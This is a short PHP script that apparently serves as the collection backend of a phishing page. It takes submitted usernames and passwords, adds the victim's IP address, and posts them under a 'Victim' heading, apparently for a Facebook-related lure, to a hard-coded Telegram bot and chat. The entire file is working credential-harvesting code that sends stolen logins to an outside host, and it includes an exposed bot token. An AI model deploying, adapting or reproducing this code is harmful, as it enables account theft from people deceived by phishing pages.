<?php
$botToken = "8555813127:AAHCwLu0MtB7bXlFvdP6eadEK1uXdz3Atec";
$chatId   = "8439268531";

$raw = file_get_contents("php://input");
$input = json_decode($raw, true);

if (!$input) {
    header("Content-Type: application/json");
    echo json_encode(["status" => "error"]);
    exit;
}

function getRealUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$user    = $input['user']    ?? 'Lama helin';
$pass    = $input['pass']    ?? 'Lama helin';
$service = $input['service'] ?? 'Lama helin';
$amount  = $input['amount']  ?? '0';
$ip      = getRealUserIP();

$message =
"😈 *Victim Cusub (FB⛓️🔨 Service)*\n".
"--------------------------\n".
"👤 *User:* `$user` \n".
"🔑 *Pass:* `$pass` \n".
"🛠 *Adeeg:* $service \n".
"🔢 *Tirada:* $amount \n".
"🌐 *IP:* [$ip](https://whoer.net/checkip?ip=$ip) \n".
"--------------------------";

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    "chat_id"    => $chatId,
    "text"       => $message,
    "parse_mode" => "Markdown"
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($postData),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 10
]);

curl_exec($ch);
curl_close($ch);

header("Content-Type: application/json");
echo json_encode(["status" => "success"]);
?>
